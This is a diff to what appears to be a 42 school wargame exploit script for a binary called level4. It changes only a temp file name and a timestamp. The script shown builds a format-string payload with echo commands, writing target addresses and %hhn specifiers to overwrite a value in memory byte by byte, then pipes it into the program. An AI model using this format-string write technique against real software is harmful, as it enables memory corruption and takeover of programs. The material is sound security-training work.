@@ -6,7 +6,7 @@
 #    By: lgarczyn <lgarczyn@student.42.fr>          +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2019/05/04 18:52:17 by lgarczyn          #+#    #+#              #
-#    Updated: 2019/05/06 03:50:11 by lgarczyn         ###   ########.fr        #
+#    Updated: 2019/05/06 05:31:11 by lgarczyn         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -32,22 +32,22 @@ The value is 12
 
 # Write the pointers to each byte on the stack in ascending order of desired value,
 
-echo -e -n "\x13\x98\x04\x08" > /tmp/u
-echo -e -n "\x12\x98\x04\x08" >> /tmp/u
-echo -e -n "\x10\x98\x04\x08" >> /tmp/u
-echo -e -n "\x11\x98\x04\x08" >> /tmp/u
+echo -e -n "\x13\x98\x04\x08" > /tmp/l4
+echo -e -n "\x12\x98\x04\x08" >> /tmp/l4
+echo -e -n "\x10\x98\x04\x08" >> /tmp/l4
+echo -e -n "\x11\x98\x04\x08" >> /tmp/l4
 
 # Reset the value counter
 
-echo -e -n "%240d" >> /tmp/u
+echo -e -n "%240d" >> /tmp/l4
 
 # Write the amount of chars needed for each value then write the value using %n
 
-echo -e -n " %12\$hhn" >> /tmp/u
-echo -e -n " %13\$hhn" >> /tmp/u
-echo -e -n "%66d%14\$hhn" >> /tmp/u
-echo -e -n "%16d%15\$hhn" >> /tmp/u
+echo -e -n " %12\$hhn" >> /tmp/l4
+echo -e -n " %13\$hhn" >> /tmp/l4
+echo -e -n "%66d%14\$hhn" >> /tmp/l4
+echo -e -n "%16d%15\$hhn" >> /tmp/l4
 
 # Feed to executable
 
-cat /tmp/u - ./level4
+cat /tmp/l4 - ./level4
